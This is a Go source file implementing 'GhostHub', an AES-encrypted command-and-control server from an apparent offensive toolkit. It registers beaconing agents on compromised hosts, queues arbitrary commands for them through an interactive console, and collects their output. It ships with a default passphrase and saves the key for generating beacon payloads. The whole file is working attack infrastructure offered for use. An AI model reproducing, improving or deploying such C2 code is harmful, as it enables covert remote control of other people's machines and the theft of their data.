package ghosthub

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/bryanparreira/davoid/internal/modules/ui"
)

type agent struct {
	ID       string
	IP       string
	OS       string
	Hostname string
	LastSeen time.Time
	Tasks    []string
	Results  []string
}

var (
	mu       sync.Mutex
	agents   = map[string]*agent{}
	aesKey   []byte
	keyFile  = "ghosthub.key"
)

func Run() error {
	ui.Header("GHOST-HUB C2 — AES Encrypted Command & Control")

	port := ui.PromptDefault("Listen port", "4445")
	passphrase := ui.PromptDefault("AES passphrase", "ghostkey2024")

	// Derive AES key from passphrase
	hash := sha256.Sum256([]byte(passphrase))
	aesKey = hash[:]

	// Save key for beacon payload generation
	os.WriteFile(keyFile, []byte(base64.StdEncoding.EncodeToString(aesKey)), 0600)

	mux := http.NewServeMux()
	mux.HandleFunc("/beacon", handleBeacon)
	mux.HandleFunc("/result", handleResult)

	// Admin console runs in goroutine
	go adminConsole(port)

	localIP := getLocalIP()
	fmt.Println()
	ui.Success(fmt.Sprintf("GhostHub listening on http://%s:%s", localIP, port))
	ui.Info(fmt.Sprintf("Key saved to: %s", keyFile))
	ui.Info("Beacon URL: http://" + localIP + ":" + port + "/beacon")
	ui.Divider()

	srv := &http.Server{
		Addr:    ":" + port,
		Handler: mux,
	}
	return srv.ListenAndServe()
}

func handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	body, _ := io.ReadAll(r.Body)

	plain, err := aesDecrypt(aesKey, string(body))
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	var data map[string]string
	if err := json.Unmarshal([]byte(plain), &data); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	agentID := data["id"]
	if agentID == "" {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	mu.Lock()
	a, exists := agents[agentID]
	if !exists {
		a = &agent{ID: agentID}
		agents[agentID] = a
		fmt.Printf("\n  %s  New agent: %s (%s @ %s)\n",
			ui.Green.Render("AGENT"),
			agentID[:8],
			data["hostname"],
			r.RemoteAddr,
		)
	}
	a.IP = r.RemoteAddr
	a.OS = data["os"]
	a.Hostname = data["hostname"]
	a.LastSeen = time.Now()

	// Return queued task
	var task string
	if len(a.Tasks) > 0 {
		task = a.Tasks[0]
		a.Tasks = a.Tasks[1:]
	}
	mu.Unlock()

	resp := map[string]string{"cmd": task}
	respJSON, _ := json.Marshal(resp)
	encrypted, _ := aesEncrypt(aesKey, string(respJSON))
	w.Write([]byte(encrypted))
}

func handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		return
	}
	body, _ := io.ReadAll(r.Body)
	plain, err := aesDecrypt(aesKey, string(body))
	if err != nil {
		return
	}
	var data map[string]string
	if err := json.Unmarshal([]byte(plain), &data); err != nil {
		return
	}
	agentID := data["id"]
	result := data["result"]

	mu.Lock()
	if a, ok := agents[agentID]; ok {
		a.Results = append(a.Results, result)
		fmt.Printf("\n  %s  [%s]  %s\n",
			ui.Cyan.Render("RESULT"),
			agentID[:8],
			ui.Yellow.Render(result),
		)
	}
	mu.Unlock()
	w.WriteHeader(http.StatusOK)
}

func adminConsole(port string) {
	time.Sleep(500 * time.Millisecond)
	fmt.Println()
	ui.Info("Admin console active. Commands: list, task <id> <cmd>, results <id>, quit")
	ui.Divider()

	for {
		input := ui.Prompt("c2")
		parts := strings.Fields(input)
		if len(parts) == 0 {
			continue
		}
		switch parts[0] {
		case "list":
			mu.Lock()
			if len(agents) == 0 {
				ui.Warn("No agents connected.")
			}
			for id, a := range agents {
				fmt.Printf("  %s  %-10s  %-15s  %-20s  %s\n",
					ui.Green.Render(id[:8]),
					a.OS,
					a.IP,
					a.Hostname,
					ui.Dim.Render(a.LastSeen.Format("15:04:05")),
				)
			}
			mu.Unlock()
		case "task":
			if len(parts) < 3 {
				ui.Warn("Usage: task <agent-id-prefix> <command>")
				continue
			}
			prefix := parts[1]
			cmd := strings.Join(parts[2:], " ")
			mu.Lock()
			found := false
			for id, a := range agents {
				if strings.HasPrefix(id, prefix) {
					a.Tasks = append(a.Tasks, cmd)
					ui.Success(fmt.Sprintf("Task queued for %s: %s", id[:8], cmd))
					found = true
				}
			}
			mu.Unlock()
			if !found {
				ui.Warn("No agent with that ID prefix.")
			}
		case "results":
			if len(parts) < 2 {
				ui.Warn("Usage: results <agent-id-prefix>")
				continue
			}
			prefix := parts[1]
			mu.Lock()
			for id, a := range agents {
				if strings.HasPrefix(id, prefix) {
					for i, r := range a.Results {
						fmt.Printf("  [%d] %s\n", i, r)
					}
				}
			}
			mu.Unlock()
		case "quit", "exit":
			os.Exit(0)
		default:
			ui.Warn("Unknown command. Use: list, task, results, quit")
		}
	}
}

// ── AES-GCM helpers ──────────────────────────────────────────────────────────

func aesEncrypt(key []byte, plaintext string) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	ct := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return base64.StdEncoding.EncodeToString(ct), nil
}

func aesDecrypt(key []byte, b64 string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return "", err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	if len(data) < gcm.NonceSize() {
		return "", fmt.Errorf("ciphertext too short")
	}
	nonce, ct := data[:gcm.NonceSize()], data[gcm.NonceSize():]
	plain, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "localhost"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}
